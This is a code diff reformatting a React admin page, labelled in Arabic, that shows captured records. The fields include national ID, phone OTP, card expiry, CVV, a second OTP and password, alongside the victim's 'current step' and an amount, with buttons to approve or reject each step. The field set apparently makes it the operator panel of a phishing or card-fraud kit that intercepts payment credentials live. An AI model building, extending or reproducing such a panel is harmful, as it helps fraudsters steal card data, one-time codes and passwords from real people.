       {/* Info Dialog */}
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="max-w-md bg-background rounded-xl shadow-lg p-6" dir="rtl">
+        <DialogContent
+          className="max-w-md bg-background rounded-xl shadow-lg p-6"
+          dir="rtl"
+        >
           <DialogHeader>
             <DialogTitle className="flex items-center gap-3 text-2xl font-semibold">
               {selectedInfo === "personal" ? (
-                <HeaderIcon icon={User} bgGradient="from-blue-400 to-blue-600" title="المعلومات الشخصية" />
+                <HeaderIcon
+                  icon={User}
+                  bgGradient="from-blue-400 to-blue-600"
+                  title="المعلومات الشخصية"
+                />
               ) : (
-                <HeaderIcon icon={CreditCard} bgGradient="from-green-400 to-green-600" title="معلومات البطاقة" />
+                <HeaderIcon
+                  icon={CreditCard}
+                  bgGradient="from-green-400 to-green-600"
+                  title="معلومات البطاقة"
+                />
               )}
             </DialogTitle>
           </DialogHeader>
@@ -1822,12 +2174,31 @@ export default function NotificationsPage() {
             <InfoSection
               items={[
                 { label: "الاسم", value: selectedNotification.name },
-                { label: "رقم الهوية", value: selectedNotification.idNumber, sensitive: true },
+                {
+                  label: "رقم الهوية",
+                  value: selectedNotification.idNumber,
+                  sensitive: true,
+                },
                 { label: "الشبكة", value: selectedNotification.network },
-                { label: "رقم الجوال", value: selectedNotification.mobile, sensitive: false },
-                { label: "الهاتف", value: selectedNotification.phone, sensitive: false },
-                { label: "رمز الهاتف", value: selectedNotification.otp2, sensitive: true },
-                { label: "البريد الإلكتروني", value: selectedNotification.email },
+                {
+                  label: "رقم الجوال",
+                  value: selectedNotification.mobile,
+                  sensitive: false,
+                },
+                {
+                  label: "الهاتف",
+                  value: selectedNotification.phone,
+                  sensitive: false,
+                },
+                {
+                  label: "رمز الهاتف",
+                  value: selectedNotification.otp2,
+                  sensitive: true,
+                },
+                {
+                  label: "البريد الإلكتروني",
+                  value: selectedNotification.email,
+                },
               ]}
             />
           )}
@@ -1850,9 +2221,21 @@ export default function NotificationsPage() {
                       ? `${selectedNotification.year}/${selectedNotification.month}`
                       : selectedNotification.expiryDate,
                 },
-                { label: "رمز الأمان (CVV)", value: selectedNotification.cvv, sensitive: false },
-                { label: "رمز التحقق (OTP)", value: selectedNotification.otp, sensitive: false },
-                { label: "كلمة المرور", value: selectedNotification.pass, sensitive: false },
+                {
+                  label: "رمز الأمان (CVV)",
+                  value: selectedNotification.cvv,
+                  sensitive: false,
+                },
+                {
+                  label: "رمز التحقق (OTP)",
+                  value: selectedNotification.otp,
+                  sensitive: false,
+                },
+                {
+                  label: "كلمة المرور",
+                  value: selectedNotification.pass,
+                  sensitive: false,
+                },
                 { label: "الخطوة الحالية", value: selectedNotification.step },
                 { label: "المبلغ", value: selectedNotification.amount },
               ]}
@@ -1860,25 +2243,34 @@ export default function NotificationsPage() {
             />
           )}
 
-          <DialogFooter >
-          <div className="grid grid-col-1 w-full gap-2">
-
-            <div className="flex">
-              <Button onClick={()=>handleApproval('approved',selectedNotification?.id!)} className="w-full bg-green-500 mx-1">
-           موافقة
-           <CheckCircle/>
-              </Button>
-              <Button variant='destructive' onClick={()=>handleApproval('rejected',selectedNotification?.id!)} className="w-full">
-                رفض
-                <X/>
-              </Button>
-            </div>
-            <div className="">
-
-              <Button onClick={closeDialog} className="w-full">
-                إغلاق
-              </Button>
-            </div>
+          <DialogFooter>
+            <div className="grid grid-col-1 w-full gap-2">
+              <div className="flex">
+                <Button
+                  onClick={() =>
+                    handleApproval("approved", selectedNotification?.id!)
+                  }
+                  className="w-full bg-green-500 mx-1"
+                >
+                  موافقة
+                  <CheckCircle />
+                </Button>
+                <Button
+                  variant="destructive"
+                  onClick={() =>
+                    handleApproval("rejected", selectedNotification?.id!)
+                  }
+                  className="w-full"
+                >
+                  رفض
+                  <X />
+                </Button>
+              </div>
+              <div className="">
+                <Button onClick={closeDialog} className="w-full">
+                  إغلاق
+                </Button>
+              </div>
             </div>
           </DialogFooter>
         </DialogContent>
@@ -1888,7 +2280,11 @@ export default function NotificationsPage() {
       <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />
 
       {/* Export Dialog */}
-      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />
+      <ExportDialog
+        open={exportDialogOpen}
+        onOpenChange={setExportDialogOpen}
+        notifications={filteredNotifications}
+      />
     </>
-  )
+  );
 }
